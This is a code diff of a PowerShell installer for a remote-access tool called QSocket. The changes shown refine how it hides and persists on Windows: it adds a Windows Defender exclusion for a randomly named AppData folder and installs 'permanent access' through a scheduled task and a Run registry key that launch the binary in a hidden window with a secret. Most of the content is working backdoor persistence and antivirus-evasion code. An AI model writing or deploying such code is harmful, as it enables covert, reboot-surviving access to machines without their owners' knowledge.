@@ -152,7 +152,7 @@ function Create-Run-Key($path, $secret)
     try {
         if(Is-Administrator){
             Print-Debug "Running as administrator"
-            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command `"$path -liqs $secret`"" >$null
+            reg add "HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run" /t REG_SZ /d "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`"" >$null
         }else{
             Print-Debug "Running as $env:UserName"
             Print-Debug "powershell.exe -WindowStyle Hidden -Command \`"$path -liqs $secret\`""
@@ -182,13 +182,14 @@ $RAND_NAME= -join ((65..90) + (97..122) | Get-Random -Count 5 | % {[char]$_})
 $SECRET_FILE= Join-Path -Path "$env:TMP" -ChildPath "$RAND_NAME.txt"
 $QS_DIR= Join-Path -Path "$env:APPDATA" -ChildPath "$RAND_NAME" 
 $QS_PATH= Join-Path -Path $QS_DIR -ChildPath "$QS_BIN_HIDDEN_NAME"
+$PERSISTENCE=$false
 Print-Status "QSocket Dir: $QS_PATH"
 mkdir $QS_DIR >$null
 
 if (Is-Administrator) {
     Print-Progress "Adding defender exclusion path"
     try {
-        Add-MpPreference -ExclusionPath "$QS_DIR" >$null
+        Add-MpPreference -ExclusionPath "$QS_DIR" 2>$null
         Print-Ok
     }catch {
         Print-Fail
@@ -252,20 +253,29 @@ if ($SECRET.Length -eq 0) {
     Print-Fatal "QSocket binary not working properly! Exiting..."
 }
 
-try {
-    Print-Progress "Installing system wide permenant access"
-    if (Is-Administrator) {
-        Create-Sceduled-Task $QS_PATH $SECRET
-        Create-Run-Key $QS_PATH $SECRET
-    }else{
-        Create-Run-Key $QS_PATH $SECRET
-    }
+if (Is-Administrator) {
+  try {
+    Print-Progress "Installing system wide permanent access via schtask"
+    Create-Sceduled-Task $QS_PATH $SECRET
     Print-Ok
-}catch{
+    $PERSISTENCE=$true
+  }catch{
     Print-Fail
-    Print-Warning "Permanent install methods failed! Access will be lost after reboot."
+  }
 }
 
+try {
+    Print-Progress "Installing system wide permanent access via registery"
+    Create-Run-Key $QS_PATH $SECRET
+    Print-Ok
+    $PERSISTENCE=$true
+}catch{
+    Print-Fail
+}
+
+if ($PERSISTENCE -eq $false) {
+  Print-Warning "Permanent install methods failed! Access will be lost after reboot."
+}
 
 try {
     Print-Progress "Starting qsocket utility"
